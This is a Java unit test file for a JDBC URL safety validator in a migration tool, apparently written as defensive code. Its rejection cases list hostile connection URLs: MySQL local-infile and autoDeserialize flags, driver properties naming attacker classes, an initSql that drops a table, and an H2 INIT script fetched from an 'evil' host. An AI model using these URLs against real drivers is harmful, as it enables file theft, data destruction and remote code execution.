package nuri.migration.jdbc;

import static org.assertj.core.api.Assertions.assertThat;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class JdbcUrlSafetyTest {

    @ParameterizedTest
    @ValueSource(strings = {
        "jdbc:mysql://db/app?allowLoadLocalInfile=true",
        "jdbc:mysql://db/app?sslMode=REQUIRED&ALLOWLOADLOCALINFILE=TRUE",
        "jdbc:mysql://db/app?allowUrlInLocalInfile=1",
        "jdbc:mysql://db/app?autoDeserialize=yes",
        "jdbc:mysql://address=(host=db)(allowLoadLocalInfile=true)/app",
        "jdbc:mysql://db/app?allowLoadLocal%49nfile=true",
        "jdbc:mysql://db/app?allowLoadLocalInfileInPath=/tmp",
        "jdbc:mysql://db/app?queryInterceptors=evil.Interceptor",
        "jdbc:mysql://db/app?propertiesTransform=evil.Transform",
        "jdbc:mariadb://db/app?allowLocalInfile=true",
        "jdbc:mariadb://db/app?socketFactory=evil.Factory",
        "jdbc:postgresql://db/app?socketFactory=evil.Factory&socketFactoryArg=x",
        "jdbc:postgresql://db/app?sslfactory=evil.Factory",
        "jdbc:postgresql://db/app?sslhostnameverifier=evil.Verifier",
        "jdbc:postgresql://db/app?sslpasswordcallback=evil.Callback",
        "jdbc:postgresql://db/app?loggerFile=/tmp/x&loggerLevel=DEBUG",
        "jdbc:postgresql://db/app?authenticationPluginClassName=evil.Plugin",
        "jdbc:sqlserver://db;databaseName=app;socketFactory=evil.Factory",
        "jdbc:sqlserver://db;socketFactoryClass=evil.Factory;socketFactoryConstructorArg=x",
        "jdbc:sqlserver://db;trustManagerClass=evil.Manager;trustManagerConstructorArg=x",
        "jdbc:sqlserver://db;accessTokenCallbackClass=evil.Callback",
        "jdbc:mysql://db/app?authenticationPlugins=evil.Plugin",
        "jdbc:mysql://db/app?defaultAuthenticationPlugin=evil.Plugin",
        "jdbc:mysql://db/app?clientInfoProvider=evil.Provider",
        "jdbc:mysql://db/app?serverConfigCacheFactory=evil.Factory",
        "jdbc:mysql://db/app?ha.loadBalanceStrategy=evil.Strategy",
        "jdbc:mysql://db/app?loadBalanceExceptionChecker=evil.Checker",
        "jdbc:mysql://db/app?profilerEventHandler=evil.Handler",
        "jdbc:mysql://db/app?logger=evil.Logger",
        "jdbc:mysql://(host=db,allowLoadLocalInfile=true)/app",
        "jdbc:postgresql://db/app?xmlFactoryFactory=evil.Factory",
        "jdbc:postgresql://db/app?connectExecutor=evil.Executor&connectExecutorArg=x",
        "jdbc:mariadb://db/app?initSql=DROP%20TABLE%20x",
        "jdbc:h2:mem:source;INIT=RUNSCRIPT FROM 'http://evil/x.sql'",
        "jdbc:oracle:thin:@//db:1521/app?oracle.jdbc.provider.password=evil",
        "jdbc:oracle:thin:@//db:1521/app?oracle.jdbc.config.file=/tmp/x",
        "jdbc:db2://db:50000/app:pluginClass=evil.Plugin;",
    })
    @DisplayName("위험한 연결 속성을 켜는 주소는 받지 않는다")
    void rejectsDangerousOptions(String url) {
        assertThat(JdbcUrlSafety.isSafe(url)).isFalse();
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "jdbc:mysql://db:3306/app?sslMode=VERIFY_IDENTITY&allowLoadLocalInfile=false&allowUrlInLocalInfile=false&autoDeserialize=false",
        "jdbc:mariadb://db:3306/app?sslMode=verify-full&allowLocalInfile=false",
        "jdbc:postgresql://db:5432/app?sslmode=verify-full",
        "jdbc:sqlserver://db:1433;databaseName=app;encrypt=true;trustServerCertificate=false",
        "jdbc:oracle:thin:@//db:1521/app",
        "jdbc:h2:mem:source;MODE=PostgreSQL;DB_CLOSE_DELAY=-1",
        "jdbc:mysql://db/app?comment=100%off",
        "jdbc:mysql://localhost/app?password=x%26socketFactory%3Dy",
        "jdbc:postgresql://db/app?options=-c%20search_path%3Dapp&currentSchema=app",
        "jdbc:sqlserver://db:1433;databaseName=app;authentication=SqlPassword;hostNameInCertificate=*.example.org",
        "jdbc:mysql://user:pass=word@db:3306,db2:3306/app?characterEncoding=UTF-8",
    })
    @DisplayName("이관 작업공간이 만드는 주소와 일반 주소는 받는다")
    void acceptsRegularUrls(String url) {
        assertThat(JdbcUrlSafety.isSafe(url)).isTrue();
    }

    @Test
    @DisplayName("주소가 없으면 판정하지 않는다 — 없는 주소는 연결 설정 검사가 거부한다")
    void nullUrlIsLeftToConfigurationChecks() {
        assertThat(JdbcUrlSafety.isSafe(null)).isTrue();
    }

    @Test
    @DisplayName("MySQL·MariaDB 에만 끈 값을 넘기고, 다른 드라이버에는 모르는 속성을 넘기지 않는다")
    void hardensOnlyMysqlFamily() {
        assertThat(JdbcUrlSafety.hardenedProperties("jdbc:mysql://db/app"))
                .containsOnlyKeys("allowLoadLocalInfile", "allowUrlInLocalInfile", "autoDeserialize")
                .containsValue("false").doesNotContainValue("true");
        assertThat(JdbcUrlSafety.hardenedProperties("JDBC:MARIADB://db/app")).containsOnlyKeys("allowLocalInfile");
        assertThat(JdbcUrlSafety.hardenedProperties("jdbc:postgresql://db/app")).isEmpty();
        assertThat(JdbcUrlSafety.hardenedProperties(null)).isEmpty();
    }
}
